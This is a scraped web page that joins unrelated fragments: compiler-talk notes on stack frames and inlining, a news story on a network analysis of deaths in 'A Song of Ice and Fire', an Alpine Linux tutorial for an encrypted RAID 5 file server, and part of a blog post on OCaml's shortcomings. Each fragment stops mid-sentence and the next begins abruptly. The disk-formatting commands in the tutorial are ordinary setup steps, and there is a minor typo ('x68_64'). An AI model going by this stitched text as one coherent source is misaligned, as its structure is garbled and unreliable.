dedicated registers for floating point values as well, or SIMD for really
wide</li>
<li>Prologue moves stack pointer to base pointer, epilogue moves base pointer
back to stack pointer, "undoing", locally manipulating the stack pointer then
rolling things back to where they previously were</li>
</ul>
<h2>00:03:50 Mechanisms in the processor</h2>
<ul>
<li>Frame pointer/base pointer (bp/fp), stack pointer (sp)</li>
<li>Usual convention is that the frame pointer doesn't change during the course
of the function's execution</li>
<li>Generated code addresses "slots" relative (at offsets from) the frame
pointer; e.g. <code>+4</code>, <code>+8</code>, etc.</li>
<li>Stack is kind of like a linked list! Pointer of the stack that says "this is
where the frame pointer <em>used to be</em> before we came into this routine".</li>
</ul>
<h2>00:05:10 Comparison to an abstract stack machine</h2>
<ul>
<li>In CS class you may learn about machines where you push two operands onto a
stack then do an add operation that consumes the top two things on the stack</li>
<li>Compare to traditional processor we use today: expanding the stack as a
single operation that makes a bunch of slots at once</li>
<li>The slots don't need to be consumed in a strictly stack-order fashion</li>
<li>Distinction of "stack machine" vs scratchpad-area style frame areas
that happen in stack-like fashion for subroutine calls</li>
</ul>
<h2>00:06:05 Some instruction set considerations</h2>
<ul>
<li>Considerations on modern machines for frequency of these operations and how
they fit in our instruction cache; e.g. on x86 <code>push</code>/<code>pop</code> are single byte
opcodes</li>
<li>On ARM we may have a "push multiple values" instruction; little CISC-y but you
do so commonly it may make some sense</li>
<li>ARMv7 had instruction allowed to push 16 registers (all GPRs) and increment
stack pointer. Yay RISC!</li>
</ul>
<h2>00:07:09 Compiler optimizations and stackiness</h2>
<ul>
<li>By moving things onto the stack -- code is constantly working with the things
in its stack frame</li>
<li>Locality, but also avoiding memory allocation subroutines (100s or 1000s of
cycle depending)</li>
<li>In scratchpad area values are tracked precisely in dataflow sort of style</li>
<li>Bring them "in" to the compiler, values becomes more trackable</li>
<li>SSA values vs arbitrary memory references</li>
<li>When structs are brought onto the stack the individual fields inside can be
broken apart and the component fields can be tracked as individual values</li>
<li>Often called "scalar replacement of aggregates" (e.g. in LLVM)</li>
<li>When we home them on the stack we can do our common optimizations, CSE, DCE;
if on the heap, may be a lot harder to to do</li>
<li>In managed languages (e.g. JavaScript, Java) would do escape analysis to show
it doesn't escape via heap to an unknown subroutine -- once placed on the
stack you can eliminate whole objects and just track sub-fields inside of it</li>
<li>Allows you to just "explode" the object itself and think about its component
fields individually and get rid of whatever doesn't matter in there</li>
</ul>
<h2>00:09:17 Eliding heap allocations in C++</h2>
<ul>
<li>Some compilers can also sometimes optimize local heap allocations, turn them
into stacky allocation</li>
<li>C++ explicitly allows you to do that as of a few years ago, Clang does that</li>
<li>If you new an object no guarantee that you're actually going to put it on the
heap / call the underlying allocator</li>
<li>Can be surprising to people -- can do SRoA, other stuff, might get rid of the
entire computation</li>
<li>Neat, unless it's not what you're trying to do</li>
<li>But seems like a key optimization to do</li>
<li>If you're thinking about things as objects instead of raw bytes having higher
level understanding you can optimize based off of is pretty key it seems?</li>
</ul>
<h2>00:10:18 Frame pointer omission</h2>
<ul>
<li>When JF started programming there was "frame pointer omission" (FPO) which
was cool because optmizers weren't as good as they are now</li>
<li>Back when you only had 8 registers for x86 the extra register could go a long
way potentially -- stack is hot in cache but doing stores and loads to memory
locations</li>
<li>Was known to some as "that flag that makes the debugger way worse" -- debug
information has to be a lot more prescriptive when you can't simply describe
where things are as an offset from a canonical (assumed unchanging) register</li>
<li>Modern CPUs doing register renaming under the hood against a much bigger
micro-architectural register set -- not as worried about saving that one
register as much of the time -- although in hot code you still might</li>
</ul>
<h2>00:11:49 "Leaf" functions</h2>
<ul>
<li>When you inline things you make bigger regions for analysis, ideally make big
fat leaf functions</li>
<li>How much of program time is generally spent in leaf functions over some set
of applications?</li>
<li>Function at the end of the call tree</li>
<li>If your subroutine doesn't call any other subroutines that's a nice property,
because now you know that everything at the end of the stack belongs to you,
you're just doing your work and popping back up to whoever called you</li>
<li>Inlining really unlocks power of leaf -- inlining into non-leaf-functions can
<em>make</em> them become the leaf</li>
<li>So long as you don't over-inline and the working set doesn't become too big
-- the compiler can know everything it does and have a good amount of work to
do</li>
<li>Small region in which you can analyze <em>everything</em>, like tiny little whole
program analysis</li>
</ul>
<h2>00:13:10 Why do we have a stack again?</h2>
<ul>
<li>Why can't we inline everything?</li>
<li>Two main issues: 1) don't necessarily know call graph for the whole program
2) recursion</li>
<li>If you knew where all the calls went (virtual/indirect/etc in your
translation unit and other ones in your program), and without recursion, you
wouldn't need a stack, you know a perfect call graph</li>
<li>For some of these you could avoid having a stack -- virtual functions but
only a few actually implementations of it, could change to test-and-branch</li>
<li>If you have a fully analyzable virtual dispatch it effectively just becomes a
switch, can potentially inline what the targets are</li>
<li>Control flow analysis takes indirect branch that can go anywhere and
enumerate the real set of possibilities (devirtualization within a
translation unit)</li>
<li>Fully analyzeable call graph is an interesting computer history topic:
FORTRAN77 classically able to do this (programs were restricted enough you
could analyze it)</li>
<li>XLA ML/array programming machine learning compiler has the same property
where the whole call graph is analyzeable so you can create a slab that's the
giant frame for the whole program you're optimizing and all allocations are
known-fixed size</li>
<li>Whole program call graph analyzeability lives on in these niche use cases!</li>
<li>In stark contrast, sometimes we need multiple different kinds of stacks at
the same time!</li>
<li>The JS engine would sometimes recur from JS calls through the VM runtime to
other JS code, and that would need to potentially create a sub-stack (!) --
multi stack problems exist beyond even just needing to analyze/manage a
single stack</li>
<li>Programming in FORTRAN is cool, for scientific code often trying to
solve a specific physics problem don't <em>usually</em> need those tools like
recursion or virtual functions</li>
<li>When everything is "monomorphized" -- you have big arrays of
fixed-value-types you can know everything about the world and really optimize
everything based off of it -- fun mode to be in for scientific computing code</li>
</ul>
<h2>00:16:34 Considerations beyond recursion and indirect calls?</h2>
<ul>
<li>Some languages use the stack for fast thread switching? Things like full
stackful coroutines?</li>
<li>Stacks in Go for example are not contiguous: more like C++ deque: linked list
of lists instead of one contiguous stack -- clever x86 code sequence that
makes it fast to find previous and next frame</li>
<li>Allows Go stacks to be distinct allocations -- each page-wise is one frame
and the next function has another frame -- can put multiple functions in one
allocation</li>
<li>Used to have really bad perf if you were in a hot loop and happened to
straddle that boundary</li>
<li>Coroutines in some languages ended up having some "stackless" stuff like
this, where the closure is heap allocated instead</li>
<li>C++ coroutines try to do away with all the heap allocations, but depends on
optimization level whether it can do that or not</li>
<li>Kind of similar for Objective-C blocks -- until recently always heap
allocated, started being stack allocated in last few years where they could</li>
<li>Language doesn't say whether stuff lives on the heap or not</li>
<li>Because stack is less constrained can live in different places, e.g. in Go</li>
<li>In some cases you remove the allocation entirely</li>
</ul>
<h2>00:18:25 Scaling to millions of threads?</h2>
<ul>
<li>If you want to be able to scale your concurrency assumptions to millions of
threads, you don't want to have huge stacks</li>
<li>Each thread has a stack, and if you have millions of threads you don't want
to be allocating too much</li>
<li>And need to be able to switch between those threads quickly</li>
<li>So raises the question: how do you usually size those stacks in the
per-thread context you have?</li>
<li>If you're doing tiny little operations; e.g. if every operation in your
program was conceptually a thread, you wouldn't want to allocate 512KiB every
time you did a tiny atomic operation</li>
</ul>
<h2>00:19:10 Managed languages putting frames on the heap</h2>
<ul>
<li>On the term "stackless": one of the <a href="https://greenlet.readthedocs.io/en/latest/">Python
"greenlet"</a> ("lightweight thread"
terminology) attempts was called <a href="https://github.com/stackless-dev/stackless/wiki">Stackless
Python</a></li>
<li>In managed languages like Python the frames can be allocated …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4885" role="main"><div><div><div><p>A <a rel="noreferrer noopener" href="https://www.pnas.org/cgi/doi/10.1073/pnas.2006465117" target="_blank">new study by researchers from five universities</a> across the UK and Ireland has found that the overarching social structure and the distribution of deaths in <em>Game of Thrones </em>reflect the typical numbers found in real human societies. As such, the study “provides quantitative support, for example, for the widespread view that deaths appear to be randomly distributed throughout the narrative even though, in fact, they are not,” the authors write.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p><p>The new paper appeared on November 2 in the journal <a rel="noreferrer noopener" href="https://www.pnas.org/" target="_blank"><em>Proceedings of the National Academy of Sciences</em></a>.</p><h2><strong>Deaths in <em>Game of Thrones</em> are anything but random</strong></h2><p>The research team consisted of physicists, mathematicians, and psychologists. They used data science and network theory to analyze <em>A Song of Ice and Fire</em>, the acclaimed book series. These books, by George R.R. Martin, formed the basis for the mega-successful HBO television series <em>Game of Thrones</em>.</p><p>“A distinguishing feature of&nbsp;<em>Ice and Fire</em>&nbsp;,” the paper writes, “is that character deaths are perceived by many readers as random and unpredictable.” Indeed, it continues, “the storyteller has manipulated the timeline of the story in such a way as to make it continuously more appealing by making significant events seem random so as to heighten the reader’s engagement.”</p><p>Likewise, the study writes,<em> “A Song of Ice and Fire</em>&nbsp;is a prodigious modern epic of considerable complexity that remains accessible to a vast congregation of devotees. Among its appeals are the uncertainty and unpredictability of its storyline as characters, including important ones, can be killed off seemingly at random.” And not even the main characters “are guaranteed safe passage from one book to the next.”<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p><p>But as the study points out, when the chronological sequence is reconstructed, the deaths are not random at all. Instead, they resemble how a wide range of common human activities are distributed for in the real world. &nbsp;&nbsp;&nbsp;</p><h2>Unravelling the sequence of deaths in Game of Thrones</h2><p>To analyze the evolution of the narrative, the authors use an approximate timeline of the events depicted in <em>Ice and Fire</em>&nbsp;based on the Westerosi calendar date. It has been compiled by fans, <a href="https://www.reddit.com/r/asoiaf/comments/1c07jw/spoilers_all_most_precise_asoiaf_timeline_in/" target="_blank" rel="noreferrer noopener">and is maintained</a> by the Reddit user identified as <a href="https://www.reddit.com/user/PrivateMajor/" target="_blank" rel="noreferrer noopener">PrivateMajor</a>. They use this timeline to assign an approximate date to each chapter of each book, which allows them to study events as they occur within the in-story timeline.</p><p>Their analysis considers only the deaths of significant characters, deemed to because they appeared in more than one chapter. They made this distinction to avoid including the deaths of “cannon-fodder” characters, “whose main purpose in the story is to die immediately after they are introduced.”</p><p>Past research has shown that inter-event time distributions for “many (nonviolent) human activities in the real world, including communication, entertainment, trading, and work, have power-law tails.” <span data-ez-name="psychnewsdaily_com-box-4"></span></p><p>The distribution of deaths in <em>Game of Thrones </em>and <em>A Song of</em>&nbsp;<em>Ice and Fire</em>&nbsp;are close to what we expect in real social networks, the study finds.</p><h2>“Almost” random intervals</h2><p>As the authors summarize, the way the deaths are distributed in the narrative makes the reader think that these deaths “occur almost at random intervals.” But then “analyzing deaths in terms of story time, this is not the case, with significant events occurring in a more natural way. Portraying significant events by discourse time instead of as they happen appears to maintain the reader’s suspense,” they write.</p><p>“These books are known for unexpected twists, often in terms of the death of a major character,” said <a rel="noreferrer noopener" href="https://www.ul.ie/dafinet/p%C3%A1draig-mac-carron" target="_blank">Pádraig MacCarron</a> of the University of Limerick. “It is interesting to see how the author arranges the chapters in an order that makes this appear even more random than it would be if told chronologically,” he said.</p><h2><strong>Thousands of characters, but Dunbar’s Number still applies</strong></h2><p>The more than 2,000 characters in <em>A Song of Ice and Fire</em> have about 41,000 interactions between them. That’s indeed a lot. But at the chapter-by-chapter level, these numbers average out to match what most people experience in real life.</p><p>Even the most predominant characters, the ones who narrate the story, have only about 150 other people to keep track of, on average. This is the same number that the average human brain has evolved to deal with. It is known as <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar’s number</a>, named after the renowned British anthropologist <a href="https://en.wikipedia.org/wiki/Robin_Dunbar">Robin Dunbar</a>. Dunbar was also a co-author of this new study.</p><p>Despite the huge number of (new) characters and interactions, Martin manages to maintain a consistent social network structure. The number of these interactions is at the upper end of the <a href="https://www.psychnewsdaily.com/new-study-shows-that-bed-sharing-couples-sleep-better/">cognitive</a> capacity of an average reader. As the study’s authors write, “the social network a reader has to consider in order to follow the story is similar in scale to natural cognitive capacity.”</p><p>So, despite there being more than 2,000 characters, none has a social network of more than about 150 people, on average. Plus, there are only 14 major “point of view” characters narrating the story. “These are frequent numbers in the structure of real social networks,” the study writes, “and they allow the reader to work within natural templates.”</p><h2>Keeping cognitive load within realistic limits</h2><p>In other words, “the story reflects experiences in the everyday social world and therefore does not overtax cognitive abilities that are evolved to match these scales.”</p><p>Similar limits have been reported for <a href="https://link.springer.com/article/10.1007%2Fs12110-003-1013-1" target="_blank" rel="noreferrer noopener">Shakespeare’s plays</a>, and seem to “reflect natural limits on mentalizing competences — the cognitive skills that underpin our <a href="https://www.psychnewsdaily.com/why-are-americans-vocabulary-skills-stagnating/">ability</a> to handle social relationships in the virtual mental sphere of the everyday social world.”</p><p>The paper also finds that <em>A Song of Ice and Fire</em> is more similar to the Icelandic sagas than to mythological stories such as England’s Beowulf or Ireland’s Táin Bó Cúailnge.</p><h2><strong>Predicting tomorrow’s complex narratives</strong></h2><p>“People largely make sense of the world through narratives,” said co-author <a href="http://www.colmconnaughton.net/" target="_blank" rel="noreferrer noopener">Colm Connaughton</a> of the University of Warwick, “but we have no scientific understanding of what makes complex narratives relatable and comprehensible. The ideas underpinning this paper are steps towards answering this question.”&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Studies like this one might even be used to map out book and film series that have yet to be created. “I am excited to see the use of network analysis grow in the future,” said <a href="http://www.complexity-coventry.org/people/single-view/detail/Yoseph_Jose/" target="_blank" rel="noreferrer noopener">Joseph Yose</a> of Coventry University. “Hopefully, combined with machine learning, we will be able to predict what an upcoming series may look like,” he said.</p><figure><img loading="lazy" width="1024" height="553" src="https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-1024x553.jpg" alt="" srcset="https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-1024x553.jpg 1024w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-300x162.jpg 300w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-768x414.jpg 768w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-360x194.jpg 360w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1.jpg 1160w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The social network at the end of the first book <em>A Game of Thrones</em>.

                            <p>If you've ever thought of building a file server, you probably had one or more of these thoughts</p>
<ul>
<li>Do I really need to <strong>waste one disk</strong> for the operating system?</li>
<li>I only have <strong>old hardware</strong> with limited RAM, can I still use it as a file server?</li>
<li>If someone <strong>steals my equipment</strong>, how can I make sure they won't have access to my data?</li>
<li>How can I set up a <strong>samba share</strong> that will allow my windows computers to access the data?</li>
<li>I don't have a display to connect to my file server. How can I do it all <strong>headless</strong>?</li>
<li>Is <strong>software raid</strong> any good? What about ZFS?</li>
</ul>
<p><strong>Well, wonder no more!</strong></p>
<p>We're going to build a system that will handle all those things!</p>

<p>My motivation for this was, that I inherited an HP Data Vault x312 <a href="https://www.reddit.com/r/DataHoarder/comments/jkb35f/neighbor_died_of_cancer_and_his_wife_told_me_shes/">from my neighbor who died</a> recently and this device is pretty old, has an Intel Atom d510 with only 2 GB of RAM and no display. It was meant to be used with Windows Home Server. My goal is to use it as an encrypted storage pool for backups running headless Alpine Linux.</p>
<figure><img loading="lazy" src="https://pictshare.net/6c1h06.png"><figcaption>HP Data Vault x312</figcaption></figure>
<hr>


<p>As in my <a href="https://blog.haschek.at/2019/build-your-own-datacenter-with-pxe-and-alpine.html">previous</a> server related <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">posts</a>, my choice of operating system for file servers is <a href="https://alpinelinux.org/about/">Alpine Linux</a> because it's so damn small (ram usage after boot will be ~100mb), fast and has a ton of up to date packages we're going to be using.</p>
<p>Also it can be configured to run from a RAM disk with configuration stored on a USB drive. Which is exactly what we're going to do.</p>
<h2>You're going to need 2 USB drives</h2>
<p>The size doesn't really matter, I'm using two 16G drives. They don't even have to be USB3, it won't make a difference.</p>
<figure><img loading="lazy" src="https://pictshare.net/800/3xiz7b.png"><figcaption>2 USB drives we'll be using</figcaption></figure>
<p>Why two?</p>
<p>We're going to put the ISO of Alpine Linux on one of them and boot it. Then we're using it to create the second one (which will be the one we're actually putting in our server).</p>
<h3>Flashing the USB</h3>
<p>Go to <a href="https://alpinelinux.org/downloads/">https://alpinelinux.org/downloads/</a> and download the latest x68_64 <strong>EXTENDED</strong> ISO and flash it <strong>to one of the USB drives</strong> using dd or some other etcher program.</p>
<p>Command if you're using dd like a pro: <code>dd if=/path/to/your/alpine-extended.iso of=/dev/sdx</code> where sdx is the device name of your USB drive. If unsure run <code>lsblk | grep disk</code> it will show you the device names and sizes for all connecte drives.</p>
<h2>Booting the install USB drive</h2>
<p>This can still be done on one of your devices and not on the file server. We're just preparing the USB installer here.</p>
<p>Plug your freshly flashed USB in a computer or laptop and boot it. You should see this screen</p>
<p>![Freshly booted Alpine Linux]()</p>
<p>Enter <code>root</code> and press enter, you're now logged in.</p>
<h2>Preparing the USB drive for the file server</h2>
<p>Now is a good time to look at the out put of <code>fdisk -l | grep Disk</code> to see which disks are found.</p>
<figure><img loading="lazy" src="https://pictshare.net/vf0ews.png"><figcaption>It should look something like this</figcaption></figure>
<p>Now plug in the second USB drive and run <code>fdisk -l | grep Disk</code> again to see which device name it has.</p>
<figure><img loading="lazy" src="https://pictshare.net/7ylr9z.png"><figcaption>USB drive is known as /dev/sdc</figcaption></figure>
<p>Great now we have to set up the new USB correctly: <code>fdisk /dev/sdc</code> (use the device name of your USB drive)</p>
<p>Now we're in fdisk. We'll empty the USB drive and create a partition that will host the image and configuration.</p>
<p>Press the following keys in fdisk:</p>
<pre><code>o -&gt; enter
n -&gt; enter
p -&gt; enter
1 -&gt; enter
enter (when asking for first sector)
enter (when asking for last sector)
a -&gt; enter
1 -&gt; enter
w -&gt; enter</code></pre>
<p>now if you run <code>fdisk -l /dev/sdc</code> you should see the new layout like this</p>
<figure><img loading="lazy" src="https://pictshare.net/gr1s3i.png"><figcaption>New USB layout</figcaption></figure>
<p>Now we format the new partition FAT32 and install the system from our booted USB drive</p>
<pre><code>mkdosfs -F32 /dev/sdc1
setup-bootable /media/sdb /dev/sdc1</code></pre>
<p>Note: <code>/media/sdb</code> should already be mounted, it's the file system of the live USB you're using. It might have a different name, check <code>df -h</code> to see what device is mounted to <code>/media/</code></p>
<figure><img loading="lazy" src="https://pictshare.net/0grvrm.png"><figcaption>Successful installation</figcaption></figure>
<h2>Let's prepare it for the fileserver</h2>
<p>If you want to install multiple servers, just plug in more USB drives, <code>fdisk</code> and <code>setup-bootable</code> them.</p>
<p>But now we want to set up the USB drive for our file server. Shut down the PC/Laptop/Server you were using, plug in only the second USB drive (the one you just installed Alpine to) and boot it.</p>
<p>It should look exactly like the first USB drive we were using but now we can save changes we make to the system.</p>
<p>The first thing we're going to run is <code>setup-alpine</code>. Here's a small guide what to enter/choose</p>
<pre><code>[your language code] us -&gt; enter
[probably the same code again] us -&gt; enter
[the hostname you want your machine to have] fileserver -&gt; enter
[eth0] -&gt; enter
[dhcp] -&gt; enter (or you can configure static IP here)
done -&gt; enter
[no] -&gt; enter
[your password] -&gt; enter
[password again] -&gt; enter
[your timezone] Europe/Vienna -&gt; enter
[none] -&gt; enter
[chrony] -&gt; enter
[1] -&gt; enter
[openssh] -&gt; enter
Which disks would you like to use: none -&gt; enter
Enter where to store configs: usb -&gt; enter
[/media/usb/cache] -&gt; enter
(ignore the last warning)</code></pre>
<p>Now you have successfully configured your image! To save changes you made to the system write .</p>
<p><code>lbu commit -d</code></p>
<p>To be able to connect to alpine from the network we need to either set up SSH to allow root logins (by editing <code>/etc/ssh/sshd_config</code> and setting <code>PermitRootLogin</code> to <code>yes</code>) or by adding your ssh keys to the authorized_keys file.</p>
<pre><code>ssh-keygen # press enter until it's done
nano .ssh/authorized_keys # and add your SSH public keys in here
lbu include /root/.ssh # we need to tell alpine that we want to include the .ssh folder to the saved config on the USB
lbu commit -d # and saving to USB</code></pre>
<p>You always need to run <code>lbu commit -d</code> after you changed any config file or installed a program otherwise it will be lost on reboot. To see which files are included run <code>lbu ls</code></p>
<p>The idea for this is that the USB has all the programs and config but all data is stored on the mounted drives.</p>
<p>To confirm it really works, reboot the system and boot from the same USB again. If it needs your new password at login everything worked.</p>
<p>Now it can be plugged into the file server and booted. If you already have other disks in your server, make sure it's set to boot from USB. For my Data Vault I didn't have to (or would have been able to) change anything in the BIOS because if it can't find a boot partition on any disk, it will go straight to USB boot. Neat!</p>
<p>If you didn't set a fixed IP address then you'll have to do a lan scan</p>
<hr>


<p>I did all the dirty benchmarking for you already. Here it is</p>
<figure><a href="https://pictshare.net/8l2o1b.png"><img loading="lazy" src="https://pictshare.net/8l2o1b.png"><figcaption>Graph that shows how slow/fast different disk configurations are. I have no idea what happend to the RAID 5 read speeds, they don't even match RAID0</figcaption></a></figure>
<p>Now that we have our system up and running it's time to add the drives and use them. But first let's install a few things that will make our lives easier.</p>
<p><code>apk add nano htop lsblk e2fsprogs</code></p>
<p>Let's look at the disk configuration we have: <code>lsblk | grep disk</code></p>
<figure><img loading="lazy" src="https://pictshare.net/x7l1qa.png"><figcaption>All disks that have been found. Data disks from sda to sdd</figcaption></figure>
<p>Awesome so we have 3x3TB and 1x 2.5TB disks (I'll change the smaller one when my new 3TB gets here)</p>
<p>From here it's basically a "choose your own adventure" thing. We have 4 drives so we can set them up in different ways.</p>
<p>My choice is: RAID 5 using <code>mdadm</code> and over the combined storage LUKS encryption. If you feel you won't need encryption you can just skip it. If your CPU is as old as mine and doesn't have the aes-ni extension, encryption will probably be bottlenecking file transfers but personally I just can't say no to an encrypted homelab.</p>
<h2>Side note: ZFS</h2>
<p>Alpine Linux fully supports ZFS. You can read <a href="https://wiki.alpinelinux.org/wiki/Setting_up_ZFS_on_LUKS">this guide</a> how to use it even with encryption on Alpine. Since ZFS requires a bit more CPU than mdadm I'll be using the latter but on my main file server at home I'm using ZFS as well.</p>
<h2>Settung up RAID 5</h2>
<p>First we'll going to need <code>mdadm</code>,  we can install it using <code>apk add mdadm</code></p>
<p>Then we`ll have to make sure it runs on boot using</p>
<pre><code>rc-update add mdadm boot
rc-update add mdadm-raid boot</code></pre>
<p>Let's create or RAID!</p>
<pre><code>mdadm --create /dev/md0 --level=5 --raid-devices=4 /dev/sda /dev/sdb /dev/sdc /dev/sdd</code></pre>
<p>Depending on your hardware and disk size it might take pretty long for the RAID to sync so you can watch it using <code>watch cat /proc/mdstat</code></p>
<figure><img loading="lazy" src="https://pictshare.net/va1pwf.png"><figcaption>Watching the raid getting made</figcaption></figure>
<p>After it's finished, we can save the raid configuration info using <code>mdadm --examine --scan &gt; /etc/mdadm.conf</code> and don't forget to <code>lbu commit -d</code> after doing so.</p>
<p>Ok so now you have to choose</p>
<h3>a) No encryption</h3>
<p>If you don't need encryption then you're almost done.</p>
<p>First we need to give the RAID device (<code>/dev/md0</code>) a file system and then mount it.</p>
<pre><code>mkfs.ext4 /dev/md0
mount -t ext4 /dev/md0 /mnt</code></pre>
<p>At this stage you should see the disk array when running <code>df -h</code>. Congratulations if you made it this far!</p>
<p>To automate mount on boot add the following to your <code>/etc/fstab</code></p>
<pre><code>/dev/md0    /mnt    ext4    rw  0   0</code></pre>
<h3>b) Using LUKS disk encryption</h3>
<p>For testing purposes I'll be using a password for encryption but if you want your server to automatically unlock after boot, see this post I wrote about the subject: <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">The encrypted homelab</a></p>
<p><code>openssl rand 512 | base64 -w 0 | tr -cd '[:alnum:]._-' | head -c 64</code></p>
<figure><img loading="lazy" src="https://pictshare.net/11ukk1.png"><figcaption>This should spit out a good password for us to use but you can use your own if you like</figcaption></figure>
<p>Now that we have our password, we encrypt the raid device</p>
<pre><code>cryptsetup -v -c serpent-xts-plain64 -s 512 --hash sha256 luksFormat /dev/md0</code></pre>
<p>Then we'll have to unlock it (after every boot too, see <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">my other post</a> on how to automate it)</p>
<pre><code>cryptsetup open /dev/md0 data</code></pre>
<p>The second parameter is now used as our new block device we can use. It creates <code>/dev/mapper/data</code> and we can now use it as if it were a normal hard disk.</p>
<p>So let's first give it a file system and then mount it</p>
<pre><code>mkfs.ext4 /dev/mapper/data
mount -t ext4 /dev/mapper/data /mnt</code></pre>
<p>Now you should see your fully encrypted data drive on <code>/mnt</code> (use <code>df -h</code> to check if it's mounted). Since you have to encrypt it before you can mount it, we can't add it to <code>/etc/fstab</code> but in <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">my other post</a> I explain how it can still be automated on boot.</p>

<p>We're going with the obvious solution here: Samba. That's linux powered windows shares which can be accessed by basically all operating systems.</p>

                    <p><em>Part of a 3 part series. Followups on <a href="https://blog.darklang.com/new-backend-fsharp/">F#</a>, <a href="https://blog.darklang.com/why-dark-didnt-choose-rust/">Rust</a></em></p><p>I built the first demo of Dark in Python, in about two weeks. A few months later when I started productizing it, I rebuilt it in OCaml. Back in 2017, when I was considering the language and platform to use for Dark, OCaml was extremely compelling:</p><ul><li>it's a high-level language with static types, so easy to make large scale changes as we figure out what the language/product was</li><li>you mostly model data with sum types, which in my mind are the best way to model data</li><li>it's very similar to the language I wanted to build (in particular, we could reuse built-in immutable data structures for Dark's values)</li><li>it had a reputation for being high-performance, which meant that we could write an interpreter for Dark and not have it be terribly slow (vs writing an interpreter in python, which might be too slow)</li></ul><p>Unfortunately, as we've built Dark we've run into significant problems that have made it challenging to build in OCaml.</p><h2 id="lack-of-libraries">Lack of libraries</h2><p>When you bet on an off-mainstream language, one of the things you accept is that many libraries are not going to be available. When there is a small community, often there aren't enough people working in the language to make important libraries. This is especially true if few people are building business applications.</p><p>In OCaml there are many high quality libraries, especially for data structures and data manipulation. The annual<a href="https://opensource.janestreet.com/core/"> Jane Street code dump</a> has been quite useful and very high quality. However, we really felt the lack of several libraries. The most obvious of these is that we had to build a <a href="https://github.com/darklang/dark/blob/main/backend/libexecution/unicode_string.mli">Unicode string library</a> ourselves (built on top of the <a href="https://erratique.ch/software/uuseg">very impressive OCaml Unicode libraries</a> built by <a href="https://erratique.ch/contact.en">Daniel Bünzli</a>), but we needed many more libraries than that.</p><p>The lack of an SDK for Google Cloud has affected us greatly. When you're searching for product-market fit, you do the simplest, easiest thing. If you lack a good SDK for your cloud provider, the simplest, easiest thing is often a terrible architectural choice. We've built our own queue on top of our database rather than using the production-quality cloud queues available on GCP. Similarly, we barely use the Cloud Storage (GCP's version of S3), because we initially put things in the database <a href="https://blog.darklang.com/evolving-darks-tracing-system/">because it was easier</a>. We've built 3 services, 2 <a href="https://github.com/darklang/dark/tree/main/containers/stroller">in</a> <a href="https://github.com/darklang/dark/tree/main/containers/queue-scheduler">Rust</a>, and 1 in <a href="https://github.com/darklang/dark/tree/main/containers/postgres-honeytail">Go</a>, to workaround the challenges we've faced.</p><p>The biggest challenge here is our use of Postgres. Postgres is a great database and we're big fans, but Cloud SQL is not a great hosted database. GCP's position is that Cloud SQL is there to tick a box and we should be using Cloud Spanner. I would love to switch to Cloud Spanner, but we have no driver for it in OCaml. Given the Postgres driver in OCaml is not particularly mature, it's hard to expect that a Cloud Spanner driver would exist, and indeed it doesn't. We've had to contribute to the <a href="https://github.com/mmottl/postgresql-ocaml/commit/81a4ae5240decd8f483a90568257cfbc1558c7ed">OCaml Postgres driver</a>, and some parts of our codebase have been <a href="https://github.com/darklang/dark/blob/main/backend/libbackend/serialize.ml#L226">well and truly mangled</a> when working around features not supported in that driver.</p><p>We've also suffered from a lack of a high-level, production web stack (there are <a href="https://github.com/anmonteiro/ocaml-h2">low-level stacks with good reputations</a> that I've struggled to use, and a <a href="https://github.com/oxidizing/sihl">few</a> <a href="https://github.com/reason-native-web/morph">new</a> ones out there that look good), in particular lacking a user authentication module. We've been using <a href="https://auth0.com/">Auth0</a> to work around this for now, which has more moving pieces than I'd like, and a shockingly high cost (our 7000 users, most of whom never log in, costs us over $500/mo).</p><p>We've worked around other missing vendor SDKs by calling their HTTP endpoints directly and that's been mostly fine. However, for libraries like encryption we don't have that option - we <a href="https://github.com/darklang/dark/pull/1455/files">hacked around a missing encryption library</a>, but decided not to ship it to production until we audited it for security (which was never actually worth the cost).</p><p>At CircleCI, we bet on Clojure. That was also a non-mainstream language, but its ability to call Java SDKs meant we had a mature cloud library, which was essential for building CircleCI. Of course, in OCaml we could call C libraries (and <a href="https://github.com/darklang/dark/pull/1841">even Rust libraries</a>, perhaps), but it doesn't match having native libraries we can call directly.</p><h2 id="learnability">Learnability</h2><p>I'm mostly in the camp that anyone can learn any language, but I saw a team struggle with OCaml, and for good reason. Language tutorials are extremely poor in OCaml compared to other languages; they're mostly lecture notes from academic courses.</p><p>The compiler isn't particularly helpful, certainly compared to Rust or Elm (both of which have been in our stack at one point). Often it gives no information about an error. Syntax errors typically say "Syntax error"; though it will try to give a good error for a mismatched brace, often incorrectly. Type errors can be a real burden to read, even after 3 years of experience with it.</p><p>The docs in OCaml are often challenging to find. The <a href="https://ocaml.janestreet.com/ocaml-core/latest/doc/base/index.html">Jane Street docs</a> have improved significantly in the last few years, but it can be a challenge to even figure out what functions are available in a particular module for most libraries. Compare to the excellent <a href="https://docs.rs/">docs.rs</a> in Rust, which has comprehensive API docs for every package in Rust.</p><p>One of the ways I personally struggled in OCaml is around <code>Lwt</code>. Lwt is (one of!) OCaml's async implementations. I couldn't figure it out several years ago and so just built a single-threaded server. The amount of workarounds and downtime we've suffered from that single decision is immense. A tutorial around building high-performance (or even medium performance!) web servers would be very valuable. </p><p>Tooling is something I read would be good in OCaml. I remember reading there was a debugger that could go back in time! I don't know where that's gone but I've never heard of anyone using it.</p><p>We have struggled to make editor tooling work for us. This is partially because we also use ReasonML and this seems to break things. Unfortunately, this is common in programming, but even more so in small communities: you might be the first person to ever try to use a particular configuration.</p><p>Finally, the disconnect between the various tools is immense. You need to understand 